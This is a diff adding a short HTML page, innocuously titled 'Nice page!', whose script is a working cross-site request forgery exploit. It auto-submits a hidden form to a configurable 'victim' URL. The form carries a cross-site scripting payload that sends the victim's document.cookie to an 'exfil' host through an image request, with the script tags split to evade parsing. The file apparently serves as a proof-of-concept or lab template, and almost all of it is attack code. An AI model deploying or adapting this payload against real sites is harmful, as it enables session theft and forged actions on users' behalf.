@@ -1,0 +1,25 @@
+<html>
+<head>
+<title>Nice page!</title>
+</head>
+<body>
+<script language="javascript" type="text/javascript"> 
+var form = document.createElement("form");
+form.setAttribute("method", 'POST');
+// TODO configure below
+form.setAttribute("action", 'http://victim/');
+
+var params= new Array()
+
+var hiddenField = document.createElement("input");
+hiddenField.setAttribute("type", "hidden");
+hiddenField.setAttribute("name", 'message');
+// TODO xss payload below
+// separate script tags into concatenated substrings to avoid browser interpreting this as ending script tag
+hiddenField.setAttribute("value", '<scr' + 'ipt>document.write("<img src=\'http://exfil/a.gif?x=" + escape(document.cookie) + "\'>") + '</scr' + 'ipt>');
+form.appendChild(hiddenField);
+
+form.submit();
+</script>
+</body>
+</html>
